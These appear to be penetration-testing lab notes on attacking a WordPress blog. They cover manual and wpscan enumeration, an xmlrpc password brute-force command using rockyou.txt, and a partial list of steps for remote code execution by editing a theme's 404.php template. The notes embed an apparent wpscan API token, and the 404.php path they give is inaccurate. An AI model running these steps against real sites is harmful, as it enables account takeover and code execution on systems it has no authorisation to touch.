Do some manual enumeration, because wpscan may miss things:
```sh
curl -s http://blog.inlanefreight.local | grep WordPress  # grep wordpress version
curl -s http://blog.inlanefreight.local/ | grep themes    # grep wordpress themes
curl -s http://blog.inlanefreight.local/ | grep plugins   # grep wordpress plugins
curl -s http://blog.inlanefreight.local/?p=1 | grep plugins # visit other pages reveal other plugins

# General enumeration
wpscan --enumerate --url http://blog.inlanefreight.local  --api-token "HaDDYs9ITqBVvrUaOP1M9uuncxcsQXRjE6CPo6cxtwE"

# login brute force
wpscan --password-attack xmlrpc --url http://blog.inlanefreight.local/ -U users.txt -P /opt/lists/rockyou.txt --random-user-agent
```

---
## Admin user
if you managed to have admin user on wordpress, that enough to get remote code execution, Do those steps:
1. go to `Appearance`.
2. Then `theme editor`
3. Choose any theme and press `select`
4. choose `404.php` template, this contain php code that will be triggered when you access `http://website/wp-content/plugin/ThemeName/404.php` 